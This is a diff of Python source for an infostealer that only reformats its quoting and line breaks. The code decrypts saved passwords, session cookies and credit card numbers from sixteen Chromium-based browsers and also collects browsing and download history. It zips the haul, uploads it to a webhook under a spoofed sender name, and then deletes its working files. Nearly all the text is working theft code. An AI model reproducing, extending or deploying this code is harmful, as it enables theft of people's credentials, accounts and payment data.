@@ -23,7 +23,8 @@ __WEB_HISTORY__ = []
 __DOWNLOADS__ = []
 __CARDS__ = []
 
-main_path = os.path.join(os.getenv("APPDATA"), 'roseontop')
+main_path = os.path.join(os.getenv("APPDATA"), "roseontop")
+
 
 class Browsers:
     def __init__(self, webhook):
@@ -45,108 +46,97 @@ class Upload:
         os.makedirs(os.path.join(main_path, "vault"), exist_ok=True)
         if __LOGINS__:
             with open(os.path.join(main_path, "vault", "logins.txt"), "w", encoding="utf-8") as f:
-                f.write('\n'.join(str(x) for x in __LOGINS__))
+                f.write("\n".join(str(x) for x in __LOGINS__))
 
         if __COOKIES__:
             with open(os.path.join(main_path, "vault", "cookies.txt"), "w", encoding="utf-8") as f:
-                f.write('\n'.join(str(x) for x in __COOKIES__))
+                f.write("\n".join(str(x) for x in __COOKIES__))
 
         if __WEB_HISTORY__:
             with open(os.path.join(main_path, "vault", "web_history.txt"), "w", encoding="utf-8") as f:
-                f.write('\n'.join(str(x) for x in __WEB_HISTORY__))
+                f.write("\n".join(str(x) for x in __WEB_HISTORY__))
 
         if __DOWNLOADS__:
             with open(os.path.join(main_path, "vault", "downloads.txt"), "w", encoding="utf-8") as f:
-                f.write('\n'.join(str(x) for x in __DOWNLOADS__))
+                f.write("\n".join(str(x) for x in __DOWNLOADS__))
 
         if __CARDS__:
             with open(os.path.join(main_path, "vault", "cards.txt"), "w", encoding="utf-8") as f:
-                f.write('\n'.join(str(x) for x in __CARDS__))
+                f.write("\n".join(str(x) for x in __CARDS__))
 
         with ZipFile(os.path.join(main_path, "vault.zip"), "w") as zip:
             for file in os.listdir(os.path.join(main_path, "vault")):
                 zip.write(os.path.join(main_path, "vault", file), file)
 
     def send(self):
-        self.webhook.send(
-            embed=Embed(
-                title="Vault",
-                description="```" +
-                '\n'.join(self.tree(Path(os.path.join(main_path, "vault")))) + "```",
-                timestamp=datetime.datetime.utcnow(),
-                color=cc.get_color()
-            ),
-            file=File(os.path.join(main_path, "vault.zip")),
-            username=cc.get_name(),
-            avatar_url=cc.get_avatar()
-        )
+        self.webhook.send(embed=Embed(title="Vault", description="```" + "\n".join(self.tree(Path(os.path.join(main_path, "vault")))) + "```", timestamp=datetime.datetime.utcnow(), color=cc.get_color()), file=File(os.path.join(main_path, "vault.zip")), username=cc.get_name(), avatar_url=cc.get_avatar())
 
     def clean(self):
         shutil.rmtree(os.path.join(main_path, "vault"))
         os.remove(os.path.join(main_path, "vault.zip"))
 
-    def tree(self, path: Path, prefix: str = '', midfix_folder: str = '📂 - ', midfix_file: str = '📄 - '):
+    def tree(self, path: Path, prefix: str = "", midfix_folder: str = "📂 - ", midfix_file: str = "📄 - "):
         pipes = {
-            'space':  '    ',
-            'branch': '│   ',
-            'tee':    '├── ',
-            'last':   '└── ',
+            "space": "    ",
+            "branch": "│   ",
+            "tee": "├── ",
+            "last": "└── ",
         }
 
-        if prefix == '':
+        if prefix == "":
             yield midfix_folder + path.name
 
         contents = list(path.iterdir())
-        pointers = [pipes['tee']] * (len(contents) - 1) + [pipes['last']]
+        pointers = [pipes["tee"]] * (len(contents) - 1) + [pipes["last"]]
         for pointer, path in zip(pointers, contents):
             if path.is_dir():
                 yield f"{prefix}{pointer}{midfix_folder}{path.name} ({len(list(path.glob('**/*')))} files, {sum(f.stat().st_size for f in path.glob('**/*') if f.is_file()) / 1024:.2f} kb)"
-                extension = pipes['branch'] if pointer == pipes['tee'] else pipes['space']
-                yield from self.tree(path, prefix=prefix+extension)
+                extension = pipes["branch"] if pointer == pipes["tee"] else pipes["space"]
+                yield from self.tree(path, prefix=prefix + extension)
             else:
                 yield f"{prefix}{pointer}{midfix_file}{path.name} ({path.stat().st_size / 1024:.2f} kb)"
 
 
 class Chromium:
     def __init__(self):
-        self.appdata = os.getenv('LOCALAPPDATA')
+        self.appdata = os.getenv("LOCALAPPDATA")
         self.browsers = {
-            'amigo': self.appdata + '\\Amigo\\User Data',
-            'torch': self.appdata + '\\Torch\\User Data',
-            'kometa': self.appdata + '\\Kometa\\User Data',
-            'orbitum': self.appdata + '\\Orbitum\\User Data',
-            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
-            '7star': self.appdata + '\\7Star\\7Star\\User Data',
-            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
-            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
-            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
-            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
-            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
-            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
-            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
-            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
-            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
-            'iridium': self.appdata + '\\Iridium\\User Data',
+            "amigo": self.appdata + "\\Amigo\\User Data",
+            "torch": self.appdata + "\\Torch\\User Data",
+            "kometa": self.appdata + "\\Kometa\\User Data",
+            "orbitum": self.appdata + "\\Orbitum\\User Data",
+            "cent-browser": self.appdata + "\\CentBrowser\\User Data",
+            "7star": self.appdata + "\\7Star\\7Star\\User Data",
+            "sputnik": self.appdata + "\\Sputnik\\Sputnik\\User Data",
+            "vivaldi": self.appdata + "\\Vivaldi\\User Data",
+            "google-chrome-sxs": self.appdata + "\\Google\\Chrome SxS\\User Data",
+            "google-chrome": self.appdata + "\\Google\\Chrome\\User Data",
+            "epic-privacy-browser": self.appdata + "\\Epic Privacy Browser\\User Data",
+            "microsoft-edge": self.appdata + "\\Microsoft\\Edge\\User Data",
+            "uran": self.appdata + "\\uCozMedia\\Uran\\User Data",
+            "yandex": self.appdata + "\\Yandex\\YandexBrowser\\User Data",
+            "brave": self.appdata + "\\BraveSoftware\\Brave-Browser\\User Data",
+            "iridium": self.appdata + "\\Iridium\\User Data",
         }
         self.profiles = [
-            'Default',
-            'Profile 1',
-            'Profile 2',
-            'Profile 3',
-            'Profile 4',
-            'Profile 5',
+            "Default",
+            "Profile 1",
+            "Profile 2",
+            "Profile 3",
+            "Profile 4",
+            "Profile 5",
         ]
 
         for _, path in self.browsers.items():
             if not os.path.exists(path):
                 continue
 
-            self.master_key = self.get_master_key(f'{path}\\Local State')
+            self.master_key = self.get_master_key(f"{path}\\Local State")
             if not self.master_key:
                 continue
 
             for profile in self.profiles:
-                if not os.path.exists(path + '\\' + profile):
+                if not os.path.exists(path + "\\" + profile):
                     continue
 
                 operations = [
@@ -168,7 +158,7 @@ class Chromium:
         if not os.path.exists(path):
             return
 
-        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
+        if "os_crypt" not in open(path, "r", encoding="utf-8").read():
             return
 
         with open(path, "r", encoding="utf-8") as f:
@@ -190,15 +180,14 @@ class Chromium:
         return decrypted_pass
 
     def get_login_data(self, path: str, profile: str):
-        login_db = f'{path}\\{profile}\\Login Data'
+        login_db = f"{path}\\{profile}\\Login Data"
         if not os.path.exists(login_db):
             return
 
-        shutil.copy(login_db, 'login_db')
-        conn = sqlite3.connect('login_db')
+        shutil.copy(login_db, "login_db")
+        conn = sqlite3.connect("login_db")
         cursor = conn.cursor()
-        cursor.execute(
-            'SELECT action_url, username_value, password_value FROM logins')
+        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
         for row in cursor.fetchall():
             if not row[0] or not row[1] or not row[2]:
                 continue
@@ -207,42 +196,40 @@ class Chromium:
             __LOGINS__.append(Types.Login(row[0], row[1], password))
 
         conn.close()
-        os.remove('login_db')
+        os.remove("login_db")
 
     def get_cookies(self, path: str, profile: str):
-        cookie_db = f'{path}\\{profile}\\Network\\Cookies'
+        cookie_db = f"{path}\\{profile}\\Network\\Cookies"
         if not os.path.exists(cookie_db):
             return
 
         try:
-            shutil.copy(cookie_db, 'cookie_db')
-            conn = sqlite3.connect('cookie_db')
+            shutil.copy(cookie_db, "cookie_db")
+            conn = sqlite3.connect("cookie_db")
             cursor = conn.cursor()
-            cursor.execute(
-                'SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
+            cursor.execute("SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies")
             for row in cursor.fetchall():
                 if not row[0] or not row[1] or not row[2] or not row[3]:
                     continue
 
                 cookie = self.decrypt_password(row[3], self.master_key)
-                __COOKIES__.append(Types.Cookie(
-                    row[0], row[1], row[2], cookie, row[4]))
+                __COOKIES__.append(Types.Cookie(row[0], row[1], row[2], cookie, row[4]))
 
             conn.close()
         except Exception as e:
             print(e)
 
-        os.remove('cookie_db')
+        os.remove("cookie_db")
 
     def get_web_history(self, path: str, profile: str):
-        web_history_db = f'{path}\\{profile}\\History'
+        web_history_db = f"{path}\\{profile}\\History"
         if not os.path.exists(web_history_db):
             return
 
-        shutil.copy(web_history_db, 'web_history_db')
-        conn = sqlite3.connect('web_history_db')
+        shutil.copy(web_history_db, "web_history_db")
+        conn = sqlite3.connect("web_history_db")
         cursor = conn.cursor()
-        cursor.execute('SELECT url, title, last_visit_time FROM urls')
+        cursor.execute("SELECT url, title, last_visit_time FROM urls")
         for row in cursor.fetchall():
             if not row[0] or not row[1] or not row[2]:
                 continue
@@ -250,17 +237,17 @@ class Chromium:
             __WEB_HISTORY__.append(Types.WebHistory(row[0], row[1], row[2]))
 
         conn.close()
-        os.remove('web_history_db')
+        os.remove("web_history_db")
 
     def get_downloads(self, path: str, profile: str):
-        downloads_db = f'{path}\\{profile}\\History'
+        downloads_db = f"{path}\\{profile}\\History"
         if not os.path.exists(downloads_db):
             return
 
-        shutil.copy(downloads_db, 'downloads_db')
-        conn = sqlite3.connect('downloads_db')
+        shutil.copy(downloads_db, "downloads_db")
+        conn = sqlite3.connect("downloads_db")
         cursor = conn.cursor()
-        cursor.execute('SELECT tab_url, target_path FROM downloads')
+        cursor.execute("SELECT tab_url, target_path FROM downloads")
         for row in cursor.fetchall():
             if not row[0] or not row[1]:
                 continue
@@ -268,28 +255,26 @@ class Chromium:
             __DOWNLOADS__.append(Types.Download(row[0], row[1]))
 
         conn.close()
-        os.remove('downloads_db')
+        os.remove("downloads_db")
 
     def get_credit_cards(self, path: str, profile: str):
-        cards_db = f'{path}\\{profile}\\Web Data'
+        cards_db = f"{path}\\{profile}\\Web Data"
         if not os.path.exists(cards_db):
             return
 
-        shutil.copy(cards_db, 'cards_db')
-        conn = sqlite3.connect('cards_db')
+        shutil.copy(cards_db, "cards_db")
+        conn = sqlite3.connect("cards_db")
         cursor = conn.cursor()
-        cursor.execute(
-            'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
+        cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards")
         for row in cursor.fetchall():
             if not row[0] or not row[1] or not row[2] or not row[3]:
                 continue
 
             card_number = self.decrypt_password(row[3], self.master_key)
-            __CARDS__.append(Types.CreditCard(
-                row[0], row[1], row[2], card_number, row[4]))
+            __CARDS__.append(Types.CreditCard(row[0], row[1], row[2], card_number, row[4]))
 
         conn.close()
-        os.remove('cards_db')
+        os.remove("cards_db")
 
 
 class Types:
@@ -300,7 +285,7 @@ class Types:
             self.password = password
 
         def __str__(self):
-            return f'{self.url}\t{self.username}\t{self.password}'
+            return f"{self.url}\t{self.username}\t{self.password}"
 
         def __repr__(self):
             return self.__str__()
@@ -326,7 +311,7 @@ class Types:
             self.timestamp = timestamp
 
         def __str__(self):
-            return f'{self.url}\t{self.title}\t{self.timestamp}'
+            return f"{self.url}\t{self.title}\t{self.timestamp}"
 
         def __repr__(self):
             return self.__str__()
@@ -337,7 +322,7 @@ class Types:
             self.target_path = target_path
 
         def __str__(self):
-            return f'{self.tab_url}\t{self.target_path}'
+            return f"{self.tab_url}\t{self.target_path}"
 
         def __repr__(self):
             return self.__str__()
@@ -351,7 +336,7 @@ class Types:
             self.date_modified = date_modified
 
         def __str__(self):
-            return f'{self.name}\t{self.month}\t{self.year}\t{self.number}\t{self.date_modified}'
+            return f"{self.name}\t{self.month}\t{self.year}\t{self.number}\t{self.date_modified}"
 
         def __repr__(self):
             return self.__str__()
